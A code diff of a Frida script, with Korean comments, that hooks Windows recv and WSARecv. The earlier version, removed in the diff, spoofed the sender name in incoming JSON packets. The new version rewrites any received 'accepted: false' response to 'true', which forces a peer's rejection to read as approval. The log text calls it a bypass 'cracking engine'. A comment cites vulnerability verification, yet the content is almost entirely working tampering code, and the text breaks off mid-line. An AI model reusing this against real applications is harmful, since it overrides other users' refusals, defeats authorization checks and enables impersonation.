@@ -1,76 +1,120 @@
-// frida_snr_patch.js
+// frida_response_bypass.js
 
 const recvAddr = Module.findExportByName("ws2_32.dll", "recv");
+const wsaRecvAddr = Module.findExportByName("ws2_32.dll", "WSARecv");
 
+// 변조할 타깃 바이트 패턴 정의 (바이트 크기를 동일하게 유지하기 위해 true 앞에 공백을 하나 추가합니다)
+// 1. "accepted": false  (9바이트)  ->  [0x20, 0x66, 0x61, 0x6c, 0x73, 0x65]
+// 2. "accepted":  true  (9바이트)  ->  [0x20, 0x20, 0x74, 0x72, 0x75, 0x65]
+const targetPattern = [0x3a, 0x20, 0x66, 0x61, 0x6c, 0x73, 0x65]; // ': false' (7바이트)
+const replacePattern = [0x3a, 0x20, 0x20, 0x74, 0x72, 0x75, 0x65]; // ':  true' (7바이트 - 공백 보정)
+
+// 띄어쓰기가 없는 형태도 방어하기 위한 서브 패턴
+// ':false' (6바이트) -> ': true' (6바이트)
+const targetPatternShort = [0x3a, 0x66, 0x61, 0x6c, 0x73, 0x65]; // ':false'
+const replacePatternShort = [0x3a, 0x20, 0x74, 0x72, 0x75, 0x65]; // ': true'
+
+function hackResponseBuffer(buffer, length) {
+    if (length < 6) return;
+
+    try {
+        Memory.protect(buffer, length, 'rwx');
+    } catch(e) {
+        return;
+    }
+
+    let isPatched = false;
+
+    // 패킷 내부에 "response" 라는 단어가 들어있는 제어 패킷인지 먼저 확인
+    let bufferStr = "";
+    try {
+        const tmpBytes = buffer.readByteArray(Math.min(length, 200));
+        const uint8 = new Uint8Array(tmpBytes);
+        for (let i = 0; i < uint8.length; i++) {
+            bufferStr += String.fromCharCode(uint8[i]);
+        }
+    } catch(e) {}
+
+    if (bufferStr.includes('"response"') || bufferStr.includes('response')) {
+        
+        // 패턴 1 스캔 (: false -> :  true)
+        for (let i = 0; i <= length - targetPattern.length; i++) {
+            let match = true;
+            for (let j = 0; j < targetPattern.length; j++) {
+                if (buffer.add(i + j).readU8() !== targetPattern[j]) {
+                    match = false;
+                    break;
+                }
+            }
+            if (match) {
+                buffer.add(i).writeByteArray(replacePattern);
+                console.log(`[🔥 응답 변조] 오프셋 ${i}에서 'accepted: false' -> 'true'로 강제 승인 변경 완료!`);
+                isPatched = true;
+                i += (targetPattern.length - 1);
+            }
+        }
+
+        // 패턴 2 스캔 (:false -> : true)
+        if (!isPatched) {
+            for (let i = 0; i <= length - targetPatternShort.length; i++) {
+                let match = true;
+                for (let j = 0; j < targetPatternShort.length; j++) {
+                    if (buffer.add(i + j).readU8() !== targetPatternShort[j]) {
+                        match = false;
+                        break;
+                    }
+                }
+                if (match) {
+                    buffer.add(i).writeByteArray(replacePatternShort);
+                    console.log(`[🔥 응답 변조(Short)] 오프셋 ${i}에서 'accepted:false' -> 'true'로 강제 승인 변경 완료!`);
+                    isPatched = true;
+                    i += (targetPatternShort.length - 1);
+                }
+            }
+        }
+    }
+}
+
+// ---- 1. 표준 수신 API(recv) 온리브 후킹 ----
 if (recvAddr) {
     Interceptor.attach(recvAddr, {
         onEnter: function (args) {
-            // args[1]은 데이터를 담을 버퍼(Buffer) 주소입니다.
-            this.buf = args[1];
-            this.len = args[2].toInt32();
+            this.buf = args[1]; // 버퍼 주소 세션에 백업
         },
         onLeave: function (retval) {
             const bytesRead = retval.toInt32();
-            if (bytesRead > 0) {
-                // 버퍼에서 데이터를 읽어옵니다.
-                const buffer = this.buf.readByteArray(bytesRead);
-                const uint8Array = new Uint8Array(buffer);
-                
-                // 바이트 배열을 문자열로 변환 (UTF-8)
-                let text = "";
-                for (let i = 0; i < uint8Array.length; i++) {
-                    text += String.fromCharCode(uint8Array[i]);
-                }
+            if (bytesRead > 0 && this.buf) {
+                hackResponseBuffer(this.buf, bytesRead);
+            }
+        }
+    });
+    console.log("[+] ws2_32.dll!recv 후킹 안착");
+}
 
-                // 제어 메시지(JSON 요청)가 포함되어 있는지 확인
-                if (text.includes('"type"') && text.includes('"request"')) {
-                    console.log("[*] 원본 패킷 발견:\n" + text);
+// ---- 2. 비동기 수신 API(WSARecv) 온리브 후킹 ----
+if (wsaRecvAddr) {
+    Interceptor.attach(wsaRecvAddr, {
+        onEnter: function (args) {
+            this.lpBuffers = args[1];
+            this.dwBufferCount = args[2].toInt32();
+        },
+        onLeave: function (retval) {
+            if (retval.toInt32() === 0 && this.lpBuffers) {
+                for (let i = 0; i < this.dwBufferCount; i++) {
+                    const wsaBufElement = this.lpBuffers.add(i * (Process.pointerSize * 2));
+                    const len = wsaBufElement.readU32();
+                    const buf = wsaBufElement.add(Process.pointerSize).readPointer();
 
-                    // 4바이트 BE 길이 헤더 이후의 실제 JSON 문자열 추출
-                    // [4바이트 길이][UTF-8 JSON] 구조를 파싱합니다.
-                    try {
-                        const jsonStartIdx = text.indexOf('{');
-                        if (jsonStartIdx !== -1) {
-                            const jsonStr = text.substring(jsonStartIdx);
-                            let payload = JSON.parse(jsonStr);
-
-                            // 시나리오 A: 송신자 이름 위조 (취약점 #6 검증)
-                            if (payload.type === "request") {
-                                payload["name"] = "이대명TL"; // 강제 변조
-                                console.log("[*] 송신자 이름 스푸핑 적용 완료!");
-                            }
-
-                            // 조작된 JSON으로 패킷 재조립
-                            const newJsonStr = JSON.stringify(payload);
-                            const newJsonBytes = [];
-                            for (let i = 0; i < newJsonStr.length; i++) {
-                                newJsonBytes.push(newJsonStr.charCodeAt(i));
-                            }
-
-                            // 새 길이 계산 (4바이트 Big Endian)
-                            const newLength = newJsonBytes.length;
-                            const lengthHeader = new Uint8Array(4);
-                            lengthHeader[0] = (newLength >> 24) & 0xFF;
-                            lengthHeader[1] = (newLength >> 16) & 0xFF;
-                            lengthHeader[2] = (newLength >> 8) & 0xFF;
-                            lengthHeader[3] = newLength & 0xFF;
-
-                            // 버퍼에 새 패킷 덮어쓰기 [길이 헤더] + [JSON 바이트]
-                            this.buf.writeByteArray(lengthHeader.buffer);
-                            this.buf.add(4).writeByteArray(new Uint8Array(newJsonBytes).buffer);
-
-                            // 리턴값(읽은 바이트 수)을 새 패킷 크기에 맞게 수정
-                            retval.replace(ptr(4 + newLength));
-                            console.log("[*] 변조된 패킷 전송 수립: " + newJsonStr);
-                        }
-                    } catch (e) {
-                        console.log("[-] 파싱 중 에러 발생: " + e);
+                    if (!buf.isNull() && len > 0) {
+                        hackResponseBuffer(buf, len);
                     }
                 }
             }
         }
     });
-    console.log("[*] ws2_32.dll!recv 후킹 성공. 패킷 대기 중...");
-} else {
-    console.log("[-] ws2_32.dll에서 recv 함수를 찾을 수 없습니다.");
+    console.log("[+] ws2_32.dll!WSARecv 후킹 안착");
 }
+
+console.log("========================================================");
+console.log("[*] 거부 응답 강제 우회(Bypass) 크래킹 엔진 가동");
+console.log("[*] 이제 상대방이 거
